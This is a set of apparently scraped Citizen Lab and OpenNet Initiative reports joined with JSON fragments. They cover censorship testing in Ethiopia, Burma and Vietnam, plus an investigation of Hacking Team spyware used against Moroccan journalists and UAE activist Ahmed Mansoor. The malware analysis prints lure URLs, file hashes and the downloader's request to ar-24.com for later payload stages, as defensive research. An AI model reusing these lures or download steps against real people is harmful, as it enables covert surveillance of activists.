criminalize the use of VoIP services to punish dissent.9 Additional restrictions exist on private actors delivering telecommunications services to third parties more generally.10 Moreover, a number of unconfirmed reports suggest that users of Internet cafes in Addis Ababa have been confronted or arrested by security officials after using the cafes to visit sensitive political websites.11\nOther reports from the country describe attempts by Internet Service Providers (ISPs) to restrict the use of tools to anonymize web browsing and circumvent Internet filtering. In May 2012, developers of the Internet anonymizer software project Tor reported that the Ethiopian Telecommunications Corporation (ETC) had begun using Deep Packet Inspection (DPI) to block access to the Tor service.12 This finding followed reports from July 2011 of an ETC-issued tender for the procurement of DPI technology.13 In December 2010 the ETC, renamed as Ethio Telecom, signed a 30 million Euro contract with France Telecom, outsourcing management of Ethio Telecom for two years.14\nPast ONI testing in Ethiopia\nThe ONI conducts technical testing of Internet filtering through the use of specially designed software distributed to researchers located in the country of interest.15 ONI has previously conducted two phases of technical testing in Ethiopia, in 2006/2007 and in 2008/2009. Both phases of testing found extensive filtering of political content.\n\n\nTesting conducted in 2006 and 2007 on the ISP ETC found that a broad variety of political and news-related websites were blocked, including opposition political sites, critical political blogs, independent Ethiopian media, human rights sites, and sites with content related to ethnic minorities.16 The entire domain of several blogging platforms, including the international Blogspot and the Ethiopia-focused Nazret, were found to be blocked. However, international news sites such as CNN and Voice of America, as well as prominent critical blogs Addis Voice and Ethiopian Review, were found to be accessible.\n\n\n \n\nTesting conducted in 2008 and 2009 on ETC found a similar variety of content to be blocked.17 A number of independent Ethiopian news sites, including Ethiopia Exchange (http://ethiox.com), were found to be blocked, while international news sites such as CNN and Voice of America remained accessible. While the use of VoIP services among the general public was restricted, the website of Skype (www.skype.com) remained accessible.\n\n2012 ONI testing results\nONI conducted testing of filtering in Ethiopia on the ISP Ethio Telecom (formerly ETC) from September 17 to 19, 2012. In total, 1375 unique URLs were tested, with 73 of those URLs found to be blocked. (Lists of URLs tested, as well as URLs found blocked, can be found in the ‘Data’ section at the end of this report.) Blocked content was found to be blocked through the use of forged TCP RST (reset) packets, a method that is not transparent to users. RST packets are typically sent by clients or servers when there are network problems, as a response to a half-open connection, or some other network anomaly.18 When a RST flag is received most networking implementations in an operating system will shut down the socket used. The result of a forged TCP RST packets from a user’s perspective, is that any attempts to access blocked content would display a typical browser error message indicating the site was unreachable rather than an explicit block page. However, analysis of packet captures conducted during testing demonstrates that attempts to access this content are disrupted through the use of forged TCP RST packets directly in response to an HTTP GET request, as shown in Figure 1 (click image to enlarge):\nFigure 1: Sample packet capture of an attempt to access http://www.addisvoice.com.\n\nWith some exceptions, the majority of URLs found to be blocked contained content directly related to Ethiopia. Most URLs found blocked belonged to ONI’s ‘political’ category,19 including independent media and critical political blogs. The blocked content includes online portals such as Nazret (http://nazret.com) and Cyber Ethiopia (http://cyberethiopia.com), diaspora media such as Toronto-based TZTA Ethiopia Newspaper (http://www.tzta.ca), and other critical political organizations, including the website of the Solidarity Committee for Ethiopian Political Prisoners (http://www.socepp.de/). The website of Oromo independence organization Oromo Liberation Front (http://www.oromoliberationfront.org) was found to be blocked. Also found blocked were the websites of a number of anonymization and circumvention tools, such as the Tor Project (https://www.torproject.org), Ultrasurf (http://ultrasurf.us), and Psiphon (http://psiphon.ca). Only two international news sites were found to be blocked, Al Jazeera (http://www.aljazeera.net) and Al Arabiya (http://www.alarabiya.net).\nA number of sites associated with recently imprisoned bloggers were also found to be blocked. EthioMedia (http://ethiomedia.com), a news site contributed to by imprisoned blogger Eskinder Nega, was found blocked. Addis Voice (http://www.addisvoice.com), founded by recently sentenced Abebe Gellaw, was blocked, as was Ethiopian Review (http://www.ethiopianreview.net), whose editor Elias Kifle was convicted in absentia for violating the country’s anti-terrorism laws.20 Addis Neger Online (http://addisnegeronline.com/),21 the site at which editors Mesfin Negash and Abiye Teklemariam posted content that lead to their imprisonment, was found to be blocked. Also found to be blocked was the website of Ginbot 7 (http://www.ginbot7.org). Although the website of prominent independent weekly newspaper The Reporter (http://www.ethiopianreporter.com) was reported blocked in April 2012,22 ONI testing found this website to be accessible.\nConclusion\nThrough a combination of legal action taken against individuals for their online writings, technical filtering of Internet content, and low Internet penetration rates23, Ethiopia remains a highly challenging space in which to express political dissent online. Technical testing conducted by ONI confirms that critical political content is filtered through non-transparent means. ONI will continue to monitor information controls and threats to freedom of expression in Ethiopia.\nAcknowledgements\nThe OpenNet Initiative would like to thank an anonymous individual for generous assistance in collecting technical data from Ethiopia.\nData\nThe complete list of blocked URLs, as well as the lists of URLs tested, can be found in the following:\nComplete list of blocked sites on Ethio Telecom\n\n[CSV] [Google Doc]\nTesting conducted from September 17 to 19, 2012\nCategory codes can be found in Google Doc version\n\nList of URLs tested on Ethio Telecom\n\nLocal List [CSV] [Google Doc]\nGlobal List [CSV] [Google Doc]\nLists used in testing conducted from September 17 to 19, 2012\nCategory codes can be found in Google Doc version\n\nImportant note about testing data: The absence of a particular URL from the list of blocked URLs is not necessarily an indication that the content is accessible in Ethiopia.

    "text": "\n\t\t\t\tCrossposted from the OpenNet Initiative blog\nAfter years spent as one of the world’s most strictly controlled information environments, the government of Burma (Myanmar) has recently begun to open up access to previously censored online content. Independent and foreign news sites, oppositional political content, and sites with content relating to human rights and political reform — all previously blocked — have recently become accessible. These developments have occurred as part of a broader process of political and economic liberalization currently underway in this historically strict authoritarian state.\nThis brief outlines the changes in information controls that have occurred during the past year and reports the results of recent OpenNet Initiative tests for Internet filtering in the country. While significant censorship of a number of types of online content persists in the country, the past year has seen a notable decrease in both the breadth and depth of filtered content.\nRecent developments in Burma\nFollowing decades of military rule, Burma has undergone a series of significant political and economic reforms since elections in November 2010. March 2011 saw the end of formal military rule in the country, with reformist Thein Sein becoming the country’s first civilian president in half a century. While by-elections held in April 2012 included numerous reports of fraud, the opposition National League for Democracy, including leader and Nobel laureate Aung San Suu Kyi, won seats after contesting their first elections since 19901. The past year has also seen the release of hundreds of political prisoners and legislative changes re-establishing labour rights in the country2.\nReforms have also extended to the country’s strict information control regime. Beginning in September 2011, reports from the country indicated that the historically pervasive levels of Internet censorship had been significantly reduced. International news sites, including Voice of America, BBC, and Radio Free Asia, long blocked by Burmese censors, had become accessible overnight.3 Reports from Voice of America seemed to confirm this accessibility, as the organization observed a significant increase in visits to their Burmese-language news service beginning in September 2011.4 Reports also indicated that a number of previously censored independent Burma-focused news sites which have been highly critical of Burma’s ruling regime, such as the Democratic Voice of Burma and Irrawaddy, were suddenly accessible.5 Following the reduction in online censorship, the head of Burma’s press censorship department described such censorship as “not in harmony with democratic practices” and a practice that “should be abolished in the near future.”6\nIn August 2012, the Burmese Press Scrutiny and Registration Department announced that all pre-publication censorship of the press was to be discontinued, such that articles dealing with religion and politics would no longer require review by the government before publication.7 Restrictions on content deemed harmful to state security, however, remained in place.8 In a September 2012 speech to the United Nations General Assembly, Burmese President Thein Sein described the country as having taken “irreversible steps” towards democracy, a speech broadcast on state television for the first time.9\nPrevious ONI research in Burma\nONI conducts technical testing of Internet filtering using specially designed software distributed to researchers located in the country of interest.10 ONI has conducted testing for Internet filtering in Burma each year since 2005. Prior to 2012, all instances of testing in Burma found pervasive blocking of web content, particularly critical political content, Burmese opposition websites, and independent media sites:\n\nONI’s earliest testing in 2005 on the ISP Bagan Cybertech found widespread blocking of critical political content, email service providers, and pornography.11 Also found blocked were sites dedicated to the indigenous Karen people (http://www.karen.org), sites related to pro-democracy leader Aung San Suu Kyi (http://www.dassk.com), and independent news media (http://www.irrawaddy.org). At the time of testing in 2005, filtering in Burma was implemented through the use of software from the U.S. company Fortinet.\n\n\nTesting conducted in 2006/2007 on ISPs Myanmar Teleport (MMT, formerly Bagan Cybertech) and Myanmar Posts and Telecom (MPT) obtained similar results to past rounds of testing. Testing found significant disparity in the breadth and depth of content filtered between the two ISPs.12 MMT’s filtering focused almost exclusively on sites with links to Burma, while MPT filtered a broader range of international content.\n\n\nTesting conducted on MMT and MPT in 2008 and 2009 found a continuation of this pattern of filtering.13 A substantial number of blogging platforms and news websites were blocked, as were circumvention and anonymizer tools and the website of VoIP provider Skype. The two ISPs tested were also found to vary in the granularity of their blocking, with MMT found to block entire domains of sensitive content while MPT was found to block the specific URL of filtered content.\n\n\nTesting conducted in 2010 on ISPs Yatanarpon Teleport (formerly MMT, Bagan Cybertech) and MPT found similar results.14 Yatanarpon was found to block a number of media sharing and social media sites, including YouTube, Flickr, and Twitter. Users who attempted to access blocked content on both of these ISPs were presented with a block page identifying the content as blocked.\n\n\nResearch conducted in 2011 by the Citizen Lab documented the use in Burma of commercial filtering products manufactured by U.S.-based Blue Coat Systems.15\n\nOther forms of information controls beyond Internet filtering have also been extensively documented in Burma. The most extreme example of such information controls occurred in 2007, when Burma’s international Internet connectivity was completely severed for two weeks following the government’s violent crackdown on widespread protests.16 In addition to restricting opportunities for social mobilization, the Internet shutdown was widely viewed as a means of preventing videos, photographs, and news reports documenting the violent protests from reaching beyond Burma’s borders.17 Other forms of information disruptions documented in Burma include website defacement and DDoS attacks against independent media websites on the anniversaries of the 2007 protests18 and the 8888 uprising.19 In the lead-up to the country’s 2010 general elections, a massive DDoS attack against MPT, Burma’s main Internet provider, effectively severed the country’s international connectivity for a second time.20\nCombined with strict regulations on information distribution, slow connection speeds, and the extremely low levels of Internet penetration in Burma, this extensive record of information control prior to 2012 reflected a highly restricted and limited information space.\n2012 ONI testing results\nONI conducted testing in Burma from August 4 to 19, 2012 on the ISP Yatanarpon Teleport. The results of these tests showed that both the scope and depth of content found to be filtered were drastically reduced compared to all previous rounds of ONI testing dating back to 2005. From a total of 1,500 URLs tested, only 132 were found to be blocked. A full list of blocked URLs, as well a lists of URLs tested, can be found in the ‘Data’ section below.\nTesting showed that ISPs in Burma block content with an explicit blockpage indicating that the requested content is blocked and offering an email address to request the re-evaluation of the categorization of the page. The block page identified during ONI’s 2012 round of testing can be seen in Figure 1.\nFigure 1: Block page seen on Yatanarpon Teleport when attempting to access restricted content in August 2012. (Click image to enlarge)\n\nAlmost all of the URLs found blocked belonged to ONI’s “Social” category.21 Pornography was still widely blocked, as was content relating to alcohol and drugs. Out of 132 total URLs found blocked, 104 belonged to the pornography and alcohol and drugs category. Also found blocked were gambling websites, online dating sites, sex education, and gay and lesbian content. A number of sites categorized as “Internet Tools” were also found blocked, including web censorship circumvention tools like Proxify (http://www.proxify.com) and filesharing services like the recently closed BTJunkie (http://btjunkie.org).\nIn contrast to past ONI testing, however, only a very small number of websites belonging to ONI’s “Political” category were found to be blocked.22 Almost all of the websites of opposition political parties, critical political content, and independent news sites previously found to be blocked were found to be accessible during 2012 testing. Only 5 of the 541 tested URLs categorized as political content were found to be blocked:\n\n“Kwe Ka Lu” (http://www.kwekalu.net/), a news site with content relating to the minority Karen group\n\n\n“Myanmar Cartoons and Entertainment News” (http://www.myanmartoons.4-all.org)\n\n\n“We Fight We Win” (http://komoethee.blogspot.com), a critical political blog\n\n\n“Freedom isn’t free” (http://www.niknayman-niknayman.co.cc), also a critical political blog\n\n\nExit International (http://www.exitinternational.net), an Australia-based euthanasia advocacy organization\n\nIt is not clear why these sites remain blocked despite the significant decrease in filtering of other political content.\nConclusion\nSince ONI began testing for Internet filtering in 2002, the practice has become a de facto global norm, with over 40 countries found to have engaged in filtering of online content. The changes seen in Burma, while still fragile, represent a rare decrease in the level of Internet filtering. While Burma remains a significant censor of a number of content categories, it has demonstrated a marked decrease in filtering of news and oppositional political content. The country has loosened a number of media restrictions, and its leadership openly discusses the end of censorship. While Burma’s reform process may be in its early stages, the country has taken steps toward opening up its information environment. ONI will continue to monitor freedom of expression issues in Burma in the months to come.\nAcknowledgements\nThe OpenNet Initiative would like to thank an anonymous individual for generous assistance in collecting technical data from Burma.\nData\nThe complete list of blocked URLs, as well as the lists of URLs tested, can be found here:\nComplete list of blocked sites on Yatanarpon\n\n[CSV] [Google Doc]\nTesting conducted from August 4 to 19, 2012\nCategory codes can be found in Google Doc version\n\nList of URLs tested in Burma\n\nLocal List [CSV] [Google Doc]\nGlobal List [CSV] [Google Doc]\nLists used in testing conducted from August 4 to 19, 2012\nCategory codes can be found in Google Doc version\n\nImportant note about testing data: The absence of a particular URL from any of the lists of blocked URLs is not necessarily an indication that the content is accessible in Burma.

    "text": "\n\t\t\t\t\nDownload PDF version\nRead Bloomberg news article\nIn this report, Citizen Lab Security Researcher Morgan Marquis-Boire describes analysis performed on malicious software used to compromise a high profile dissident residing in the United Arab Emirates. The findings indicate that the software is a commercial surveillance backdoor distributed by an Italian company known as Hacking Team. The report also describes the potential involvement of vulnerabilities sold by the French company, VUPEN.\nIntroduction\nIn July of this year, Morgan Marquis-Boire and Bill Marczak published analysis of what appeared to be FinSpy, a commercial trojan from the FinFisher suite of surveillance tools sold by Gamma Group International. Their report, From Bahrain with Love: FinFisher’s Spykit Exposed?, presented evidence consistent with the use of FinSpy to target Bahraini dissidents, both within Bahrain and abroad.\nA range of other companies sell surveillance backdoors and vulnerabilities for what they describe as “lawful intercept tools.” Recently CSO magazine published an article reporting on claims by anti-virus company Dr Web that a backdoor known as “Crisis” or “DaVinci” was, in fact, the commercial surveillance tool “Remote Control System” sold by Milan, Italy-based lawful intercept vendor Hacking Team.1 According to an article published by Slate, the same backdoor was used to target Moroccan citizen journalist group Mamfakinch.2\nThis report examines the targeting of Mamfakinch and evidence suggesting that the same commercial surveillance toolkit described in these articles appears to have also been used in a recent campaign targeting Ahmed Mansoor, a human rights activist based in the United Arab Emirates (UAE). Additionally, it examines the possibility that a vulnerability linked to the French company VUPEN was used as the vector for intrusion into Ahmed Mansoor’s online presence.\nThe findings of this report contribute to a body of evidence of a growing commercial market for offensive computer network intrusion capabilities developed by companies in Western democratic countries. While the majority of these companies claim to sell their products to a restricted client base of law enforcement, military, and intelligence agencies, this report shows another example of commercial network intrusion tools being used against dissidents in countries with poor human rights records.\nThe market for commercial computer network intrusion capabilities has become a focus of controversy and debate about regulatory and legal controls that might be exercised over sales to such regimes or uses of the technology to target dissidents. Following the publication of From Bahrain with Love: FinFisher’s Spykit Exposed, the UK government reaffirmed that existing controls restricting the export of cryptographic systems apply to the Gamma Group’s exports of FinSpy.\nIn general, targeted malware attacks are an increasing problem for human rights groups, who can be particularly vulnerable to such attacks due to limited resources or lack of security awareness.\nRecent Background: Da Vinci and Mamfakinch.com\nOn Friday the 13th of July 2012, the Moroccan citizen media and journalism project Mamfakinch3 was targeted by an electronic attack that used surveillance malware. Mamfakinch.com, a website that is frequently critical of the Moroccan government, received a message via their website directing recipients to a remote webpage:\nSvp ne mentionnez pas mon nom ni rien du tout je ne veux pas d embrouilles…\nhttp://freeme.eu5.org/scandale%20(2).doc\nThe text, which hints at a sensitive scoop or lead translates roughly as “please don’t mention my name and don’t say anything at all [about me] I don’t want to get mixed up in this”.\nThe logs of the website reveal this message was sent from Moroccan IP space:\n41.137.57.198 – – [13/Jul/2012:20:48:44 +0100] “GET /nous-contacter/ HTTP/1.1” 200 9865 “https://www.mamfakinch.com/” “Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1”\n41.137.57.198 – – [13/Jul/2012:20:48:46 +0100] “GET /wp-content/plugins/wp-cumulus/tagcloud.swf?r=8659047 HTTP/1.0” 200 34610 “https://www.mamfakinch.com/nous-contacter/” “Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1”\n41.137.57.198 – – [13/Jul/2012:20:48:47 +0100] “GET /nous-contacter/?_wpcf7_is_ajax_call=1&_wpcf7=2782 HTTP/1.1” 200 9886 “https://www.mamfakinch.com/nous-contacter/” “Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1”\n41.137.57.198 – – [13/Jul/2012:20:50:08 +0100] “POST /nous-contacter/ HTTP/1.1” 200 139 “https://www.mamfakinch.com/nous-contacter/” “Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1”\n41.137.57.198 – – [13/Jul/2012:20:50:12 +0100] “GET /nous-contacter/ HTTP/1.1” 200 9887 “https://www.mamfakinch.com/nous-contacter/” “Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1”\n41.137.57.198 – – [13/Jul/2012:20:50:14 +0100] “GET /nous-contacter/?_wpcf7_is_ajax_call=1&_wpcf7=2782 HTTP/1.1” 200 9888 “https://www.mamfakinch.com/nous-contacter/” “Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1”\nThe IP from which the targeting message was uploaded (41.137.57.198) is from a Moroccan range dedicated to mobile 3G Internet users in the capital Rabat and its surroundings:\ninetnum: 41.137.56.0 – 41.137.57.255\nnetname: INWI-PDSN1-Rabat001\ncountry: MA\nadmin-c: AN2-AFRINIC\ntech-c: AN2-AFRINIC\nThe page, found at http://freeme.eu5.org/scandale%20(2).doc prompted the user for the installation of malicious java, file, “adobe.jar”:\n53cd1d6a1cc64d4e8275a22216492b76db186cfb38cec6e7b3cfb7a87ccb3524 adobe.jar\nThis file then facilitated the installation of a multi-platform (OSX and Windows) backdoor.\nArchive: adobe.jar\nLength Date Time Name\n——— ———- —– —-\n253 2012-07-09 14:33 META-INF/MANIFEST.MF\n374 2012-07-09 14:33 META-INF/SIGNAPPL.SF\n888 2012-07-09 14:33 META-INF/SIGNAPPL.DSA\n0 2011-09-15 11:07 META-INF/\n3853 2011-09-15 11:07 WebEnhancer.class\n1043456 2012-07-09 16:33 win\n993440 2012-07-09 16:33 mac\n——— ——-\n2042264 7 files\nIn the contents of the .jar you can see files called “win” and “mac” which correspond to Windows and OSX backdoors respectively:\nc93074c0e60d0f9d33056fd6439205610857aa3cf54c1c20a48333b4367268ca win\n10fa7fa952dfc933b96d92ccd254a7655840250a787a1b4d9889bf2f70153791 mac\nThe Windows backdoor contains a variety of clear-text strings which are found in the SSH-client, “Putty”.

First identified by Russian Antivirus company Dr Web on July 25th, 2012, the backdoor has been called “Remote Control System,” “Crisis” and “DaVinci”.\nThe Hacking Team Remote Control System (RCS) is described in a leaked copy of their promotional literature as:\n“A stealth, spyware-based system for attacking, infecting and monitoring computers and smartphones. Full intelligence on target users even for encrypted communications (Skype, PGP, secure web mail, etc.)”4\nThe Hacking Team public website stipulates that their technology is sold only to a restricted customer base:\n“…we provide effective, easy-to-use offensive technology to the worldwide law enforcement and intelligence communities.”5\nUAE Human Rights Activist Compromised\nAhmed Mansoor is a prominent UAE blogger and one of the ‘UAE Five’, a group of Emirati activists who were imprisoned from April to November 2011 on charges of insulting President Khalifa bin Zayed Al Nahyan, Vice President Mohammed bin Rashid Al Maktoum, and Crown Prince Mohammed bin Zayed Al Nahyan of the United Arab Emirates.6\nOn the 23rd of July, he received the following email (click image to enlarge):\n\nThis email, sent from a suggestively titled e-mail address, urges the recipient to read a ‘very important message’ and it contained the following attachment:\ncd1fe50dbde70fb2f20d90b27a4cfe5676fa0e566a4ac14dc8dfd5c232b93933 veryimportant.doc\nThe attachment is malicious. To the user it appears to be a Microsoft Word document, however it in fact is an RTF file containing an exploit which allows the execution of code that downloads surveillance malware.\nThis document exploits a stack-based buffer overflow in the RTF format that has been previously characterized:\n“Stack-based buffer overflow in Microsoft Office XP SP3, Office 2003 SP3, Office 2007 SP2, Office 2010, Office 2004 and 2008 for Mac, Office for Mac 2011, and Open XML File Format Converter for Mac allows remote attackers to execute arbitrary code via crafted RTF data, aka “RTF Stack Buffer Overflow Vulnerability.”7\nWhen Ahmed Mansoor opened the document, his suspicions were aroused due to garbled text displayed. His email account was later accessed from the following suspicious IPs:\nBrowser United Arab Emirates (92.99.46.94) Jul 26 (19 hours ago)\nIMAP United Arab Emirates (83.110.5.136) Jul 26 (1 day ago)\nIMAP United Arab Emirates (83.110.5.136) Jul 25 (2 days ago)\nIMAP United Arab Emirates (83.110.5.136) Jul 24 (3 days ago)\nIMAP United Arab Emirates (83.110.5.46) 6:54 am (3 hours ago)\nAnalysis of “veryimportant.doc”\nThe file “veryimportant.doc” is a downloader that downloads the second stage of the malware via HTTP:\nGET /0000000031/veryimportant.doc2 HTTP/1.1\nHost: ar-24.com\nExamination of the sample displays use of the windows API to download the 2nd stage (click image to enlarge):\n\nThe 2nd stage is called “veryimportant.doc2”:\nb5462a2be69d268a7d581fe9ee36e8f31d5e1362d01626e275e8f58029e15683 veryimportant.doc2\nThis is also a downloader that downloads the 3rd stage which appears to be the actual backdoor (click image to enlarge):\n\nThe executable code is downloaded from: http://ar-24.com/0000000031/veryimportant.doc3\n277cae7c249cb22ae43a605fbe901a0dc03f11e006b02d53426a6d11ad241a74 veryimportant.doc3\nSimilar in behavior and appearance to the windows version of the RCS backdoor which targeted Mamfakinch, ‘veryimportant.doc3’ contains a variety of clear-text strings which are found in the SSH-client, “Putty”.

Promotional materials for this backdoor advertise the following features:12\n“\nRemote Control System can monitor and log any action performed by means of a personal computer:\nWeb Browsing\nOpened/Closed/Deleted Files\nKeystrokes (any UNICODE language)\nPrinted Documents\nChat, email, instant messaging\nRemote Audio Spy\nCamera Snapshots\nSkype Conversations\n”\nThe same promotional document mentions “Zero-day exploits” as a possible remote infection vector.\nAn additional sample with structural similarities to the 1st and 2nd stages was discovered in Virus Total.\nThis sample uses an exploit that has similarities in shellcode with “veryimportant.doc” however, the exploit it uses is newer, the Adobe Flash Player “Matrix3D” Integer Overflow.13 Searching for the origin of this exploit revealed a public mailing list post taking credit for discovery of this bug stating: “This vulnerability was discovered by Nicolas Joly of VUPEN Security”.\nVUPEN are a French Security company who provide a variety of services including the sale of:\n“…extremely sophisticated and government grade exploits specifically designed for offensive missions.”14\nThey claim to have discovered the vulnerability in January of this year at which point they shared this with their customers, prior to public disclosure in August:\n2012-01-25 – Vulnerability Discovered by VUPEN and shared with customers\n2012-08-21 – Public disclosure\nThe sample appears to have been created in May of 2012 prior to public disclosure:\nCreated = 2012-05-15T10:39:00Z\nLast Saved by = “1785429”\nGenerator = “Microsoft Office Word”\nLast Modified = 2012-05-15T10:39:00Z\nWhile VUPEN take public credit for the discovery of this bug, it is possible that the exploit used here was not written by VUPEN but was independently discovered and weaponized by another party.\nRecommendations\nThe use of social engineering and commercial surveillance software attacks against activists and dissidents is becoming more commonplace.\nFor at risk communities, gaining awareness of targeted threats and exercising good security practices when using email, Skype, or any other communication mechanism are essential. Users should be vigilant concerning all e-mails, attached web links, and files. In particular, carefully assess the authenticity of any such materials referencing sensitive subject matter, activities, or containing misspellings or unusual diction. If you believe that you are being targeted be especially cautious when downloading files over the Internet, even from links that are purportedly sent by friends.\nFor further tips on detecting potential malware attacks and preventing compromise, see Citizen Lab’s recommendations for defending against targeted attacks.\nAcknowledgements\nMalware analysis and report by Morgan Marquis-Boire.\nAdditional analysis by Andrew Lyons, Bill Marczak and Seth Hardy.\nAdditional Thanks\nThanks to Eva Galperin of the Electronic Frontier Foundation for activist outreach work with Mamfakinch.\nThanks to Chris Davis and The Secure Domain Foundation for malware and DNS information.\nAdditional thanks to John Scott-Railton.\nFootnotes\n1 http://hackingteam.it/\n2 https://www.mamfakinch.com/\n3 https://www.mamfakinch.com/\n4 http://wikileaks.org/spyfiles/files/0/31_200810-ISS-PRG-HACKINGTEAM.pdf\n5 http://hackingteam.it/index.php/about-us\n6 https://en.wikipedia.org/wiki/UAE_Five\n7 http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3333\n8 http://www.opmsecurity.com/security-tools/who-we-are.html\n9 http://www.opmsecurity.com/\n10 http://taxhavens.us/\n11 https://www.linode.com/ – A company which provides virtual server hosting.\n12 http://wikileaks.org/spyfiles/files/0/31_200810-ISS-PRG-HACKINGTEAM.pdf\n13 http://www.securityfocus.com/archive/1/524143/30/60/threaded\n14 http://www.vupen.com/english/\nBack to top\nMedia Coverage\n\nThe Globe and Mail\nSlate\nNew York Times\neWeek\nInfoSecurity Magazine\nTechWeek Europe\nLiquida Magazine (Italian)\n\nAbout Morgan Marquis-BoireMorgan Marquis-Boire is a Technical Advisor at the Citizen Lab, Munk School of Global Affairs, University of Toronto.

    "description": "Cross posted from the ONI Blog.",
    "text": "\n\t\t\t\tCross posted from the ONI Blog.\nInformation openness has come under further threat in Vietnam, as the ongoing suppression of critical voices within the country may be strengthened through recently proposed regulations regarding use of the Internet. The new regulations seek to further criminalize and ban controversial web content, which combined with Vietnam’s long history of Internet censorship could further restrict an already limited information environment. Those same regulations also seek to impose new restrictions on bloggers, a community that has long experienced detainments, intimidation, and assaults.\nIn the wake of these proposed extensions to the country’s already strict information controls regime, OpenNet Initiative (ONI) conducted in-country testing to document and analyze state-level filtering of online content. This brief outlines the new restrictions proposed in the country, provides background about ONI’s past research in Vietnam, and reports the results of ONI’s most recent tests for Internet filtering.\nRecent developments: New regulations and continued crackdown on bloggers\nIn recent months, a number of significant developments in Vietnam have threatened to further limit an already restricted information space. A draft decree seeks to impose new regulations on Vietnam’s information space, potentially increasing the government’s ability to censor content and prosecute bloggers. These new proposed regulations accompany ongoing targeting of critical bloggers in Vietnam, who continue to be imprisoned, harassed, and assaulted for their writings.\nDraft decree\nIn April 2012, the Ministry of Information and Communication introduced the Decree on the Management, Provision, Use of Internet Services and Information Content Online1, which would force foreign content providers to increase cooperation with Vietnamese officials by removing content deemed illegal2 and potentially housing data centres within the country.3 The proposed decree would introduce stricter rules against the posting of critical or slanderous content online, as well as impose additional restrictions on users, including the requirement that users use their real names online and that bloggers post their real names and contact information on their blogs.4 Vague wording in the proposed decree would prohibit “undermining the grand unity of all people,” “undermining the fine customs and traditions of the nation” or “abusing the provision and use of the Internet and information.”5 The proposed regulations were widely criticized6 upon their introduction and were not formally introduced by the original June 2012 target date. As of August 2012, the implementation date of the new regulations remains unclear.\nThreats to bloggers\nONI’s last country profile7 of Vietnam documented a pattern of extensive harassment and imprisonment of bloggers, a trend that continues today. Since 2011, reports have continued to emerge of harsh action against bloggers, including abuse in prison,8 intimidation of families,9 extended prison sentences for publishing controversial materials,10 forced shut down of blogs,11 detention to prevent participation in public protests,12 trials behind closed doors,13 and physical assault after posting controversial material.14 Blogger Paulus Le Son has been held without trial since his arrest in August 2011, following his coverage of the arrest of blogger Cu Huy Ha Vu.15 In August 2012, blogger Dinh Dang Dinh was sentenced to six years’ imprisonment following his posting of material that was critical of government corruption and an environmentally sensitive mining project.16 Three prominent bloggers, Dieu Cay, Phan Thanh Hai, and Ta Phong Tan, saw their trial delayed in July 2012 following the death by self-immolation of Tan’s mother.17 The combination of judicial and extra-judicial action against bloggers with new regulations that would further limit and criminalize the posting of critical content online serve to increase the dangers faced by bloggers operating in Vietnam.\nPrevious ONI testing in Vietnam\nONI conducts technical testing of Internet filtering using specially designed software distributed to researchers located in the country of interest.18 ONI has conducted three prior phases of testing for Internet filtering in Vietnam, in 2005, 2007 and 2010. All three periods of testing, which in total tested three of the country’s largest Internet Service Providers (ISPs), documented evidence of Internet filtering. In all cases, most of the content found filtered was in Vietnamese and related to sensitive political topics in the country. This filtered content included material critical of the Vietnamese Communist Party and content relating to the country’s human rights situation, indigenous peoples and religious groups. In addition, Internet circumvention and anonymization tools were also found to be blocked.\n\nTesting conducted in 2005 on the ISPs Financing and Promoting Technology Corporation (FPT) Telecom and Vietnam Posts and Telecommunications Group (VNPT) found that the majority of sites blocked within the testing sample were Vietnamese-language sites and related to sensitive political issues in the country.\n\n\nIn 2007, tests conducted on FPT and VNPT found that the majority of blocked content was again specific to Vietnam, including the Vietnamese-language version of Radio Free Asia (http://www.rfa.org/vietnamese/), content relating to local communities (http://www.nguoidan.net; http://vietnamdaily.com/), and sites containing strong anti-Communist views (http://www.conong.com; http://vietnamvietnam.com/). Although most of the content found blocked related specifically to Vietnam and was in Vietnamese, there were exceptions, such as the English-language version of Radio Free Asia (http://www.rfa.org/) and the website of international NGO Human Rights Watch (www.hrw.org).\n\n\nTesting conducted in 2010 on FPT Telecom and Viettel found similar trends in filtered content. While evidence of filtering was found in all categories that ONI tests, the majority of content found filtered was Vietnamese-language content critical of the Vietnamese Communist Party. Websites found blocked included those advocating political reform (such as http://x-cafevn.org and http://viettan.org) as well as internationally-based news sites such as the Vietnam Daily News (http://vietnamdaily.com), Huó’ng Du’ó’ng (http://huongduong.com.au), and Vietmedia (http://vietmedia.net). Human Rights Watch remained the only website of an international human rights group that was blocked. Also found blocked were Facebook and sites dedicated to tools used to circumvent Internet filtering.\n\nAll testing periods found inconsistencies in the level of filtering between ISPs, in both the breadth and depth of content filtered. No ISP was found to block pornographic content, despite this being a stated justification for Internet censorship. Finally, with the exception of 2005 testing on VNPT, all ISPs in the country were found to filter through DNS tampering. This method of filtering returns inaccurate IP address information during the domain name resolution process, rendering the website inaccessible in a manner that is not transparent to users about what content is blocked.19 Despite the lack of transparency, DNS tampering is often straightforward to bypass, and circumvention methods are well documented by the Vietnamese Internet community.20\n2012 ONI testing results\nONI conducted testing between April and August 2012 on three Vietnamese ISPs: VNPT, Viettel, and FPT Telecom. Two lists of URLs were tested: a ‘global list’ of internationally relevant and popular websites, and a ‘local list’ of content specific to Vietnam’s political and social context. The global list consisted of 1,124 URLS, while the local list contained 322 URLs, for a total of 1,446 URLs. Each ISP was tested at least three times over the testing period.\nThe results of testing in 2012 were similar to previous rounds of ONI testing in the country, with filtering primarily targeting critical political content and news sites related to Vietnam, as well as online censorship circumvention tools. As in past testing, filtering was not consistently applied across ISPs, with Viettel found to block more content than both VNPT and FPT. Of the sample of 1,446 URLs tested, Viettel was found to block 160 URLs, FPT was found to block 121 URLs, and VNPT was found to block 77 URLs.\nAll three ISPs were found to use DNS tampering in order to restrict access to content. Attempts to access filtered content on VNPT returned an IP address of 127.0.0.1 (localhost) during the domain name resolution process, which would render the content inaccessible. See Figure 1 for a side-by-side comparison of the headers received from VNPT (“Field Results”) and from the control in Canada 